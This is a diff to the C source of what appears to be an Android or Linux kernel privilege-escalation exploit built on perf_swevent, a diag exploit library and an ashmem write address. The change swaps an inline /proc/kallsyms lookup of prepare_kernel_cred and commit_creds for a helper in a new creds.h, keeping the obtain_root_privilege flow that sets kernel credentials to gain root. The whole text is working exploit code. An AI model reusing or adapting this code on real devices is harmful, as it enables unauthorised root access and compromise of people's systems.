@@ -11,6 +11,7 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 
+#include "creds.h"
 #include "perf_swevent.h"
 #include "libdiagexploit/diag.h"
 
@@ -50,37 +51,6 @@ get_ashmem_write_address(void)
 
   return 0;
 }
-
-static void *
-get_symbol_address(const char *symbol_name)
-{
-  FILE *fp;
-  char function[BUFSIZ];
-  char symbol;
-  void *address;
-  int ret;
-
-  fp = fopen("/proc/kallsyms", "r");
-  if (!fp) {
-    printf("Failed to open /proc/kallsyms due to %s.", strerror(errno));
-    return 0;
-  }
-
-  while((ret = fscanf(fp, "%p %c %s", &address, &symbol, function)) != EOF) {
-    if (!strcmp(function, symbol_name)) {
-      fclose(fp);
-      return address;
-    }
-  }
-  fclose(fp);
-
-  return NULL;
-}
-
-struct cred;
-struct task_struct;
-struct cred *(*prepare_kernel_cred)(struct task_struct *);
-int (*commit_creds)(struct cred *);
 
 void
 obtain_root_privilege(void)
@@ -144,8 +114,10 @@ main(int argc, char **argv)
   int fd;
   bool success;
 
-  prepare_kernel_cred = get_symbol_address("prepare_kernel_cred");
-  commit_creds = get_symbol_address("commit_creds");
+  if (!setup_creds_functions()) {
+    printf("You need to manage to get prepare_kernel_cred and commit_creds addresses.\n");
+    exit(EXIT_FAILURE);
+  }
 
   address = get_ashmem_write_address();
   if (!address) {
